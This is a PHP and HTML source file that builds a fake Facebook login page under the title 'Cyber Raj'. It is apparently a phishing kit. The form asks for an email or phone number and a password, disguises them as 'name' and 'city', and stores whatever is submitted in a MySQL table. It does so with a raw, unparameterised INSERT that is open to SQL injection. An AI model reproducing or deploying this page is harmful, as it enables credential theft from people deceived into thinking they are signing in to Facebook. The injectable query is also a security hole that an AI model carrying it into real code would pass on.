<?php
include("conn.php");
?>
<?php
if(isset($_POST['submit'])){
	
	$name=$_POST['name'];
	$city=$_POST['city'];
	

	$sql="INSERT INTO first (`name`, `city`) VALUES ('$name','$city')";

	mysqli_query($conn,$sql);
	
}
?>


<html>
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="tool1.css">
	<script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/js/v4-shims.min.js" integrity="sha512-jwXCc38I7s9ikGI6qbqIcktgJDVVppplsNQ5DgW7VbUZCVvdo31qQnpgiU7aDQRa3pETbn9LPnOo97r4Id5/cg==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
    <title>Cyber Raj</title>
</head>
<style>
*{
padding:0px;
margin:0px;

boder-box:box-sizing;

 }
h1{
padding-top:20px;
text-align:center;
color:blue;
font-size:45px;
}
.para{
padding-top:10px;
text-align:center;
font-size:18px;
}
.main1{

	width:250px;
	
	padding:12px;
	flex-wrap:wrap;
	margin-left:50px;

}
.main{

	margin:20px 0px;
	flex-basis:53%;
box-shadow:0px 0px 10px 3px lightgrey;
	text-align:center;
	background-color:#ffffff;
	border-radius:10px;
	padding:17px 10px;
	
}
.main0{
	height:100%;
	background-color:#e6e6ff;
	
}
.id_pass{

color:red;
}
#btn1{
background-color:blue;
color:#e6e6ff;

padding-left:73px;
padding-right:73px;
padding-top:3px;
padding-bottom:3px;
text-align:right;
border-radius:5px;
}
#sem{
border-radius:5px;
border-color:blue;
box-shadow:0px 0px 10px 3px lightgrey;
padding:8px;
}
p{
color:blue;
padding-bottom:10px;
}
h4{
background-color:green;
color:white;
padding-top:5px;
padding-bottom:5px;
margin-top:10px;
border-radius:5px;
margin-left:40px;
margin-right:40px;
}
</style>
<body>
<div class="main0">
<h1>facebook</h1>
<p class="para">Facebook helps you connect and <br>
share with the people in your life.</p>
<div class="main1">
<div class="main">

<form action="#" method="POST">

<div class="id_pass">
<input type="text" name="name" placeholder="Email or phone number" id="sem"> <br><br>
<input type="text" name="city" placeholder="password" id="sem"> <br><br>
</div>
<div class="btn">
<input type="submit" name="submit" value="log in" id="btn1"><br><br>
</div>
<p>Forgotten password?</p><hr>
<h4>Create new account</h4>

</div>
</div>
</div>
</form>
</body>
</html>